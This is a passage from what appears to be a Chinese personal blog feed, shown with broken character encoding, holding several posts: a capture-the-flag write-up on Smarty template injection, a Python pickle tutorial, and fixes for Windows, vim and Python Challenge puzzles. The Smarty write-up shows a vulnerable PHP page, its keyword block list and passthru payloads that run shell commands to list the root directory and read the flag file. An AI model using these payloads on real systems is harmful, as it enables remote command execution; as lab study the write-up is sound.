<p>å°†ä»£ç å¤åˆ¶å‡ºæ¥ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./libs/Smarty.class.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;passÂ aÂ parameterÂ andÂ maybeÂ theÂ flagÂ file&#x27;sÂ filenameÂ isÂ randomÂ :&gt;&quot;</span>;  </span><br><span class="line"><span class="variable">$smarty</span> =Â <span class="keyword">new</span> Smarty();  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>)&#123; highlight_file(<span class="string">&#x27;index.php&#x27;</span>);  </span><br><span class="line">Â Â Â Â <span class="keyword">foreach</span>Â (<span class="variable">$_GET</span> <span class="keyword">AS</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)  </span><br><span class="line">Â Â Â Â &#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">print</span> <span class="variable">$key</span>.<span class="string">&quot;\n&quot;</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag|\/flag/i&quot;</span>, <span class="variable">$value</span>))&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;./template.html&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;<span class="keyword">elseif</span>(preg_match(<span class="string">&quot;/system|readfile|gz|exec|eval|cat|assert|file|fgets/i&quot;</span>, <span class="variable">$value</span>))&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;./template.html&#x27;</span>);Â Â Â Â Â Â Â Â Â Â Â Â   </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â   </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;<span class="keyword">else</span>&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;eval:&quot;</span>.<span class="variable">$value</span>);  </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;  </span><br><span class="line">Â Â Â Â Â Â Â Â   </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>å‘ç°å…³é”®è¯<code>smarty</code>ã€‚</p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>æœ¬é¢˜å·²çŸ¥æ¨¡æ¿å¼•æ“ä¸ºSSTIï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±åº”è¯¥åˆ¤æ–­ä»¥ä¸‹ç‰ˆæœ¬ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;$smarty.version&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113325.png" /></p>
<p>ç‰ˆæœ¬ä¸º3.1ã€‚</p>
<p>é‚£ä¹ˆ<a href="https://hdfzzf.icu/2022/04/05/Smartyæ¨¡æ¿æ³¨å…¥/">Smartyæ¨¡æ¿æ³¨å…¥</a>ä¸­çš„å¸¸è§„åˆ©ç”¨ã€{literal}æ ‡ç­¾ã€é™æ€æ–¹æ³•éƒ½æ— æ³•ä½¿ç”¨ï¼Œé‚£åªèƒ½ä½¿ç”¨{if}æ ‡ç­¾å’Œå‘½ä»¤æ‰§è¡Œã€‚</p>
<h2 id="å‘½ä»¤æ‰§è¡Œ">å‘½ä»¤æ‰§è¡Œ</h2>
<p>æŸ¥æ‰¾flagçš„è·¯å¾„ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=&#123;passthru(<span class="string">&#x27;ls /&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113844.png" /></p>
<p>æ ¹æ®æœ€å¼€å§‹çš„æç¤ºï¼Œflagçš„æ–‡ä»¶åæ˜¯éšæœºå–å¾—ï¼Œå› æ­¤åˆ¤æ–­çº¢æ¡†å°±æ˜¯flagæ–‡ä»¶ã€‚</p>
<p>æ¥ç€éœ€è¦è¯»å–flagï¼ˆæ³¨æ„catè¢«è¿‡æ»¤äº†ï¼‰ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=&#123;passthru(<span class="string">&#x27;tac /_9764&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405114505.png" /></p>
<h2 id="ifæ ‡ç­¾">{if}æ ‡ç­¾</h2>
<p>å…¶å®å’Œå‘½ä»¤æ‰§è¡Œæ²¡ä»€ä¹ˆä¸åŒã€‚payloadå¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. ?a=&#123;<span class="keyword">if</span> passthru(<span class="string">&#x27;ls /&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line"><span class="number">2</span>. ?a=&#123;<span class="keyword">if</span> passthru(<span class="string">&#x27;tac /_9764&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405114645.png" /></p>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>Smarty</tag>
      </tags>
  </entry>
  <entry>
    <title>pickle åº“</title>
    <url>/2022/01/30/pickle%20%E5%BA%93/</url>
    <content><![CDATA[<p>pickle åº“çš„ç®€å•ä½¿ç”¨ã€‚</p>
<span id="more"></span>
<h1 id="å‰è¨€">å‰è¨€</h1>
<p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://docs.python.org/zh-cn/3/library/pickle.html">pickle</a></p>
<h1 id="ä»‹ç»">ä»‹ç»</h1>
<p>æ¨¡å— pickle å®ç°äº†å¯¹ä¸€ä¸ª Python å¯¹è±¡ç»“æ„çš„äºŒè¿›åˆ¶åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p>
<h1 id="å¸¸ç”¨æ–¹æ³•">å¸¸ç”¨æ–¹æ³•</h1>
<p>ä¸»è¦ç”±ä¸¤ç±»æ¥å£ï¼Œå³åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p>
<p>å…¶ä¸­åºåˆ—åŒ–åŒ…æ‹¬ï¼š 1. dump() 2. dumps()</p>
<p>ååºåˆ—åŒ–åŒ…æ‹¬ï¼š 1. load() 2. loads()</p>
<p><strong>åºåˆ—åŒ–åçš„å¯¹è±¡æ˜¯ bytes ç±»å‹çš„ï¼Œååºåˆ—åçš„å¯¹è±¡åŒæ ·ä¹Ÿæ˜¯ bytes ç±»å‹çš„ï¼Œä¹Ÿå°±æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</strong></p>
<h2 id="dump">dump</h2>
<p>è¯­æ³•ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>å°†å¯¹è±¡ obj åºåˆ—åŒ–ä»¥åçš„å¯¹è±¡å†™å…¥å·²æ‰“å¼€çš„ file object fileã€‚</p>
</blockquote>
<p>å‚æ•°ï¼š ä¸»è¦å‚æ•°å°±æ˜¯å‰ä¸¤ä¸ªï¼š - objï¼šè¦åºåˆ—åŒ–çš„å¯¹è±¡ - fileï¼šåºåˆ—åŒ–å®Œä¹‹åçš„å¯¹è±¡éœ€è¦å†™å…¥åˆ° file ä¸­ã€‚</p>
<p>ä¾‹å­ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickleä½¿ç”¨çš„æ–‡ä»¶/after.p&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    pickle.dump(tar, f)</span><br></pre></td></tr></table></figure></p>
<h2 id="dumps">dumps</h2>
<p>è¯­æ³•ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
<p>å‚æ•°ï¼š - objï¼šè¦åºåˆ—åŒ–çš„å¯¹è±¡ - å°‘äº† file</p>
<ul>
<li>è¿”å›å€¼ <strong>ç›´æ¥è¿”å›åºåˆ—åŒ–åçš„äºŒè¿›åˆ¶å¯¹è±¡ã€‚ï¼ˆè¿™æ˜¯ä¸ dump æœ€å¤§çš„åŒºåˆ«ï¼‰</strong></li>
</ul>
<p>ä¾‹å­ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(tar))</span><br></pre></td></tr></table></figure></p>
<p>ç»“æœï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x04name\x94\x8c\x05lihua\x94\x8c\x03age\x94K\x1eu.&#x27;</span><br></pre></td></tr></table></figure></p>
<h2 id="load">load</h2>
<p>è¯­æ³•ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.load(file, *, protocol=<span class="literal">None</span>, fiximports=<span class="literal">True</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
<p>å‚æ•°ï¼š - fileï¼šè¦ååºåˆ—çš„<strong>äºŒè¿›åˆ¶æ–‡ä»¶</strong></p>
<p>ä¾‹å­ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickleä½¿ç”¨çš„æ–‡ä»¶/after.p&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="built_in">print</span>(pickle.load(f))</span><br></pre></td></tr></table></figure></p>
<p>åˆ©ç”¨ä¸Šé¢çš„ dump çš„åºåˆ—åŒ–åçš„äºŒè¿›åˆ¶æ–‡ä»¶åšæ¼”ç¤ºï¼Œå¾—åˆ°ç»“æœï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="loads">loads</h2>
<p>è¯­æ³•ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.loads(data, /, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
<p>å‚æ•°ï¼š - dataï¼šéœ€è¦ååºåˆ—åŒ–çš„<strong>äºŒè¿›åˆ¶å¯¹è±¡</strong></p>
<p>è¿”å›å€¼ï¼š <strong>ç›´æ¥è¿”å›ååºåˆ—åŒ–åçš„å¯¹è±¡ã€‚ï¼ˆè¿™æ˜¯ä¸ load çš„æœ€å¤§åŒºåˆ«ï¼‰</strong></p>
<p>ä¾‹å­ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line">tars = pickle.dumps(tar)  <span class="comment"># å…ˆåºåˆ—åŒ–</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(tars)) <span class="comment"># å†ååºåˆ—åŒ–</span></span><br></pre></td></tr></table></figure></p>
<p>ç»“æœï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pickle</tag>
      </tags>
  </entry>
  <entry>
    <title>windows ä¸ŠCDé©±åŠ¨å™¨çš„åˆ é™¤é—®é¢˜</title>
    <url>/2022/03/28/windows%20%E4%B8%8ACD%E9%A9%B1%E5%8A%A8%E5%99%A8%E7%9A%84%E5%88%A0%E9%99%A4%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>è®°å½•ä¸ªäººæ—¥å¸¸ç”Ÿæ´»ä¸­é‡åˆ°çš„ç¹ççš„å°é—®é¢˜çš„è§£å†³ã€‚</p>
<span id="more"></span>
<h1 id="é—®é¢˜æè¿°">é—®é¢˜æè¿°</h1>
<p>æœ‰æ—¶å€™ï¼Œç”µè„‘ä¸Šæ€»ä¼šè«åå…¶å¦™çš„å®‰è£…äº†å¦‚ä¸‹ CDé©±åŠ¨å™¨ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224202.png" /></p>
<p>åˆ é™¤ä¹Ÿåˆ ä¸æ‰ï¼Œæ‰“å¼€ä¹Ÿæ‰“å¼€ä¸äº†ï¼Œå¾ˆçƒ¦ã€‚</p>
<h1 id="åŸå› ">åŸå› </h1>
<p>CDé©±åŠ¨å™¨è®¡ç®—æœº-è®¾å¤‡å’Œé©±åŠ¨å™¨åˆ†ç±»ä¸‹çš„è®¡ç®—æœºå…‰é©±ç®¡ç†ï¼Œå¯åŠ è½½ISOæ–‡ä»¶ï¼Œå¤šåœ¨è®¡ç®—æœºå®‰è£…<code>UltraISO</code>è½¯ç¢Ÿé€šç­‰è™šæ‹Ÿå…‰é©±è½¯ä»¶åè‡ªåŠ¨åœ¨æˆ‘çš„ç”µè„‘ä¸‹åˆ›å»ºCDé©±åŠ¨å™¨å›¾æ ‡ã€‚</p>
<p>çŸ¥é“åŸå› åï¼Œè§£å†³çš„åŠæ³•å°±å¾ˆç®€å•äº†ã€‚</p>
<h1 id="é—®é¢˜è§£å†³">é—®é¢˜è§£å†³</h1>
<p>é¦–å…ˆï¼Œä»¥ç®¡ç†å‘˜æ–¹å¼æ‰“å¼€ <code>UltraISO</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224452.png" /></p>
<p><code>é€‰é¡¹ -&gt; é…ç½®</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224557.png" /></p>
<p>ç„¶å <code>è™šæ‹Ÿå…‰é©±</code>ï¼Œ<strong>å°†è®¾å¤‡æ•°é‡æ”¹ä¸ºæ— </strong></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224629.png" /></p>
<p>ç„¶åå³å¯çœ‹åˆ° CDé©±åŠ¨å™¨å·²ç»æ¶ˆå¤±äº†ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224711.png" /></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windowså°çŸ¥è¯†</tag>
      </tags>
  </entry>
  <entry>
    <title>vimç¼©è¿›é—®é¢˜</title>
    <url>/2022/04/07/vim%E7%BC%A9%E8%BF%9B%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>è®°å½•äº†å…³äºLinuxä¸­vimçš„ç¼©è¿›é—®é¢˜ã€‚</p>
<span id="more"></span>
<h1 id="é—®é¢˜æè¿°">é—®é¢˜æè¿°</h1>
<p>ä¹‹å‰æœ‰ä¸€æ¬¡ç¼–å†™å®Œè„šæœ¬è¿è¡Œæ—¶ï¼Œå‘ç°ä¸åœçš„æŠ¥é”™ï¼Œä¿¡æ¯ä¸º <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TabError: Inconsistent use of tabs and spaces in indentation</span><br></pre></td></tr></table></figure></p>
<p>ä¹Ÿå°±æ˜¯å‘Šè¯‰æˆ‘ç¼©è¿›å‡ºç°äº†é”™è¯¯ã€‚å¯æ˜¯æˆ‘æ£€æŸ¥äº†å¥½å‡ éä»£ç ï¼Œç¡®å®šä¸å­˜åœ¨è¿™æ ·çš„ç¼©è¿›é”™è¯¯ï¼Œäºæ˜¯ä¸Šç½‘æœç´¢ï¼Œç»ˆäºæ‰¾åˆ°äº†è§£å†³æ–¹æ¡ˆã€‚</p>
<h1 id="è§£å†³æ–¹æ¡ˆ">è§£å†³æ–¹æ¡ˆ</h1>
<p>é¦–å…ˆè¿›å…¥ <code>/etc/vim/vimrc</code>ï¼Œç„¶ååœ¨æ–‡ä»¶æœ€ååŠ å…¥ä¸‹é¢å‡ è¡Œï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set tabstop=4</span><br><span class="line">set softtabstop=4</span><br><span class="line">set shiftwidth=4</span><br><span class="line">set expandtab</span><br><span class="line">set autoindent</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407094249.png" /></p>
<p>ç„¶åå°±å¯ä»¥æˆåŠŸè¿è¡Œè„šæœ¬äº†ã€‚</p>
<p>æ€»ç»“ä¸€ä¸‹å°±æ˜¯åœ¨vimç©ºæ ¼é”®ä¸åˆ¶è¡¨ç¬¦ä¸èƒ½æ··ç”¨ï¼Œæ··ç”¨æ—¶å°±ä¼šå‡ºç°æŠ¥é”™</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>python challenge é¢˜è§£</title>
    <url>/2022/01/29/python%20challenge%20%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>è¿™æ˜¯ä¸ªäººçš„ python challenge çš„åˆ·é¢˜è®°å½•ï¼Œç½‘å€æ˜¯ï¼š<a href="http://www.pythonchallenge.com/">python challenge</a>ã€‚æ›´å¤šå†…å®¹è¯·ç‚¹å‡» <strong>é˜…è¯»å…¨æ–‡</strong>ï¼Œå¦‚æœ‰é”™è¯¯ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºæŒ‡å‡ºã€‚</p>
<span id="more"></span>
<h1 id="level-0">level 0</h1>
<h2 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h2>
<p>é¢˜ç›®ä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220129214059.png" /></p>
<p>æç¤ºï¼šä¿®æ”¹ url çš„å€¼ï¼Œå¹¶ä¸”ç”»é¢ä¸­ä¸º <span class="math inline">\(2^{38}\)</span>ï¼Œå½“å‰ url ä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.pythonchallenge.com/pc/def/0.html</span><br></pre></td></tr></table></figure></p>
<h2 id="æ–¹æ³•">æ–¹æ³•</h2>
<p>ä»£ç ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = <span class="number">2</span> ** <span class="number">38</span></span><br><span class="line"><span class="built_in">print</span>(res) <span class="comment"># 274877906944</span></span><br></pre></td></tr></table></figure></p>
<p>å°† url ä¸­çš„ 0 ç”¨ 274877906944 ä»£æ›¿å³å¯ã€‚</p>
<h1 id="level-1">level 1</h1>
<h2 id="é¢˜ç›®ä¿¡æ¯-1">é¢˜ç›®ä¿¡æ¯</h2>
<p>é¢˜ç›®ä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220129215240.png" /></p>
<p>æ ¹æ®å›¾ç‰‡åº”è¯¥æ˜¯æŸç§åŠ å¯†æ–¹æ³•ï¼Œå›¾ä¸­çš„ <code>K-&gt;M, O-&gt;Q, E-&gt;G</code>ï¼Œæ­£å¥½ç¬¦åˆè§„å¾‹ï¼š<strong>Kå¾€åä¸¤ä¸ªå­—æ¯å°±æ˜¯Mï¼ŒOå¾€åä¸¤ä¸ªå­—æ¯å°±æ˜¯Qï¼ŒEå¾€åä¸¤ä¸ªå­—æ¯å°±æ˜¯G</strong>ã€‚çŒœæµ‹åªè¦æŠŠä¸‹é¢ç²‰è‰²çš„å­—æ¯å…¨éƒ¨ç”¨è‡ªå·±çš„åä¸¤ä¸ªå­—æ¯ä»£æ›¿å³å¯ã€‚</p>
<h2 id="æ–¹æ³•-1">æ–¹æ³• 1</h2>
<p>ä»£ç ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">encypt_str = <span class="string">&quot;g fmnc wms bgblr rpylqjyrc gr zw fylb. rfyrq ufyr amknsrcpq ypc dmp. bmgle gr gl zw fylb gq glcddgagclr ylb rfyr&#x27;q ufw rfgq rcvr gq qm jmle. sqgle qrpgle.kyicrpylq() gq pcamkkclbcb. lmu ynnjw ml rfc spj. &quot;</span> <span class="comment"># åŸæ¥çš„å­—ç¬¦ä¸²  </span></span><br><span class="line">  </span><br><span class="line">shift = <span class="number">2</span> <span class="comment"># åç§»æ­¥æ•°  </span></span><br><span class="line">new_str = <span class="string">&quot;&quot;</span> <span class="comment"># æ–°çš„å­—ç¬¦ä¸²  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> encypt_str:  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>.isalpha(ch): <span class="comment"># åˆ¤æ–­æ˜¯å¦æ˜¯å­—æ¯  </span></span><br><span class="line">        ch = <span class="built_in">ord</span>(ch)</span><br><span class="line">        ch = ((ch + shift) - <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span> <span class="comment">#  y å’Œ z å˜æˆ a å’Œ b</span></span><br><span class="line">        ch = <span class="built_in">chr</span>(ch)  </span><br><span class="line">    new_str += ch  </span><br><span class="line"><span class="built_in">print</span>(new_str)</span><br></pre></td></tr></table></figure> ï¼ˆéœ€è¦æ³¨æ„çš„æ˜¯ y å’Œ z å˜æˆ a å’Œ b çš„æ—¶å€™ï¼ï¼ï¼ï¼‰</p>
<p>ç»“æœï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i hope you didnt translate it by hand. thats what computers are for. doing it in by hand is inefficient and that&#x27;s why this text is so long. using string.maketrans() is recommended. now apply on the url.</span><br></pre></td></tr></table></figure></p>
<p>å‘ç°é™¤äº†æç¤ºæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ maketrans() æ–¹æ³•ä¹‹å¤–ï¼Œæ²¡æœ‰å…¶ä»–ä¿¡æ¯ã€‚æˆ‘ä»¬å›åˆ° url <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.pythonchallenge.com/pc/def/map.html</span><br></pre></td></tr></table></figure></p>
<p>æ ¹æ®æœ¬é¢˜çš„åŠ å¯†æ–¹æ³•ï¼Œå°† <code>map -&gt; ocr</code> å³å¯è·³è½¬ä¸‹ä¸€å…³ã€‚ ï¼ˆå…¶å®ï¼Œè¿ä»£ç éƒ½æ²¡å¿…è¦å†™ï¼ï¼ï¼ï¼‰</p>
<h2 id="æ–¹æ³•-2">æ–¹æ³• 2</h2>
<h3 id="maketrans-æ–¹æ³•ä»‹ç»">maketrans() æ–¹æ³•ä»‹ç»</h3>
<blockquote>
<p>Python maketrans() æ–¹æ³•ç”¨äºåˆ›å»ºå­—ç¬¦æ˜ å°„çš„è½¬æ¢è¡¨ï¼Œå¯¹äºæ¥å—ä¸¤ä¸ªå‚æ•°çš„æœ€ç®€å•çš„è°ƒç”¨æ–¹å¼ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºéœ€è¦è½¬æ¢çš„å­—ç¬¦ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¹Ÿæ˜¯å­—ç¬¦ä¸²è¡¨ç¤ºè½¬æ¢çš„ç›®æ ‡ã€‚ <strong>æ³¨ï¼š</strong>ä¸¤ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦å¿…é¡»ç›¸åŒï¼Œä¸ºä¸€ä¸€å¯¹åº”çš„å…³ç³»ã€‚python 3 å’Œ python 2 çš„ä½¿ç”¨æ–¹æ³•ä¸åŒï¼Œ2 éœ€è¦å¯¼å…¥ stringï¼Œè€Œ 3 ä¸éœ€è¦ã€‚</p>
</blockquote>
<ul>
<li><p>è¯­æ³•ï¼š <code>str.maketrans(intab, outtab)</code></p></li>
<li><p>å‚æ•°ï¼š</p>
<ul>
<li>intabï¼šå­—ç¬¦ä¸²ä¸­è¦æ›¿ä»£çš„å­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²ã€‚</li>
<li>outabï¼šä¸ intab ä¸€ä¸€å¯¹åº”çš„æ˜ å°„å­—ç¬¦çš„å­—ç¬¦ä¸²ã€‚</li>
</ul></li>
<li><p>è¿”å›å€¼ï¼š è¿”å›å­—ç¬¦ä¸²è½¬æ¢åç”Ÿæˆçš„æ–°å­—ç¬¦ä¸²ã€‚</p></li>
<li><p>ä¸€èˆ¬é…åˆ translate() ä½¿ç”¨</p></li>
</ul>
<h3 id="translate-æ–¹æ³•ä»‹ç»">translate() æ–¹æ³•ä»‹ç»</h3>
<blockquote>
<p>Python translate() æ–¹æ³•æ ¹æ®å‚æ•°tableç»™å‡ºçš„è¡¨(åŒ…å« 256 ä¸ªå­—ç¬¦)è½¬æ¢å­—ç¬¦ä¸²çš„å­—ç¬¦, è¦è¿‡æ»¤æ‰çš„å­—ç¬¦æ”¾åˆ° del å‚æ•°ä¸­ã€‚</p>
</blockquote>
<ul>
<li><p>è¯­æ³•ï¼š <code>str.translate(table[, deletechars]);</code></p></li>
<li><p>å‚æ•°ï¼š</p>
<ul>
<li>tableï¼šç¿»è¯‘è¡¨ï¼Œç¿»è¯‘è¡¨æ˜¯é€šè¿‡maketransæ–¹æ³•è½¬æ¢è€Œæ¥ã€‚</li>
<li>deletecharsï¼šå­—ç¬¦ä¸²ä¸­è¦è¿‡æ»¤çš„å­—ç¬¦åˆ—è¡¨ã€‚</li>
</ul></li>
<li><p>è¿”å›å€¼ï¼š è¿”å›ç¿»è¯‘åçš„å­—ç¬¦ä¸²ã€‚</p></li>
<li><p>æœ¬é¢˜æ¼”ç¤ºï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">encypt_str = <span class="string">&quot;g fmnc wms bgblr rpylqjyrc gr zw fylb. rfyrq ufyr amknsrcpq ypc dmp. bmgle gr gl zw fylb gq glcddgagclr ylb rfyr&#x27;q ufw rfgq rcvr gq qm jmle. sqgle qrpgle.kyicrpylq() gq pcamkkclbcb. lmu ynnjw ml rfc spj. &quot;</span></span><br><span class="line"></span><br><span class="line">intab = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>  </span><br><span class="line">outtab = <span class="string">&quot;cdefghijklmnopqrstuvwxyzab&quot;</span>  </span><br><span class="line">trantab = encypt_str.maketrans(intab, outtab)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(encypt_str.translate(trantab))</span><br></pre></td></tr></table></figure></p></li>
</ul>
<h2 id="æ–¹æ³•-3">æ–¹æ³• 3</h2>
<h3 id="zip-æ–¹æ³•ä»‹ç»">zip() æ–¹æ³•ä»‹ç»</h3>
<blockquote>
<p><strong>zip()</strong> å‡½æ•°ç”¨äºå°†å¯è¿­ä»£çš„å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œå°†å¯¹è±¡ä¸­ <strong>å¯¹åº”çš„å…ƒç´ </strong> æ‰“åŒ…æˆä¸€ä¸ªä¸ªå…ƒç»„ï¼Œç„¶åè¿”å›ç”±è¿™äº›å…ƒç»„ç»„æˆçš„å¯¹è±¡ï¼Œè¿™æ ·åšçš„å¥½å¤„æ˜¯èŠ‚çº¦äº†ä¸å°‘çš„å†…å­˜ã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ list() è½¬æ¢æ¥è¾“å‡ºåˆ—è¡¨ã€‚ä¹Ÿå¯ä»¥ç”¨ dict() è½¬æ¢ä¸ºå­—å…¸ï¼Œæ­¤æ—¶å°±äº§ç”Ÿäº†æ˜ å°„å…³ç³»ã€‚ å¦‚æœå„ä¸ªè¿­ä»£å™¨çš„å…ƒç´ ä¸ªæ•°ä¸ä¸€è‡´ï¼Œåˆ™è¿”å›åˆ—è¡¨é•¿åº¦ä¸æœ€çŸ­çš„å¯¹è±¡ç›¸åŒï¼Œåˆ©ç”¨ * å·æ“ä½œç¬¦ï¼Œå¯ä»¥å°†å…ƒç»„è§£å‹ä¸ºåˆ—è¡¨ã€‚</p>
</blockquote>
<ul>
<li><p>è¯­æ³•ï¼š <code>zip([iterable, ...])</code></p></li>
<li><p>å‚æ•°ï¼š</p>
<ul>
<li>iterablï¼šä¸€ä¸ªæˆ–å¤šä¸ªè¿­ä»£å™¨</li>
</ul></li>
